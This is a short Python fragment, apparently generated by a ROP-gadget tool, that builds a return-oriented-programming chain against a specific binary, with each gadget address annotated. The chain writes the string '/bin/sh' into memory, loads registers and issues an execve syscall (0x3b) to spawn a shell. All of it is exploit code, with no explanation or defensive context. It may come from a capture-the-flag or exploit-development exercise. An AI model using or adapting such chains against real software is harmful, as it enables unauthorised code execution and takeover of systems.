payload = p64(0x407a1f)
#0x0000000000407a1f: pop rax; ret 0; 
payload += p64(0x40627f)+p64(0x408fed)
# 0x0000000000408fed: mov edx, dword ptr [rsp + 4]; mov rsi, r15; mov rdi, rbp; call rax; 
payload += b''
# 0x000000000040627f: pop rbx; pop rbp; ret; 
payload += p64(0x41d05000000000)+p64(0x407a1f)
# 0x0000000000407a1f: pop rax; ret 0; 
payload += p64(0x68662f6e69622f)+p64(0x412934)
# 0x0000000000412934: mov qword ptr [rdx + 0x20], rax; add rsp, 8; pop rbx; pop rbp; pop r12; pop r13; ret; 
payload += p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x407a1f)
# 0x0000000000407a1f: pop rax; ret 0; 
payload += p64(0x40627f)+p64(0x408fed)
# 0x0000000000408fed: mov edx, dword ptr [rsp + 4]; mov rsi, r15; mov rdi, rbp; call rax; 
payload += b''
# 0x000000000040627f: pop rbx; pop rbp; ret; 
payload += p64(0x0)+p64(0x407a1f)
# 0x0000000000407a1f: pop rax; ret 0; 
payload += p64(0x40803b)+p64(0x411682)
# 0x0000000000411682: pop rdi; jmp rax; 
payload += p64(0x41d070)
# 0x000000000040803b: pop rsi; movzx eax, al; ret; 
payload += p64(0x0)+p64(0x407a1f)
# 0x0000000000407a1f: pop rax; ret 0; 
payload += p64(0x3b)+p64(0x417873)
# 0x0000000000417873: syscall; 
payload += b''
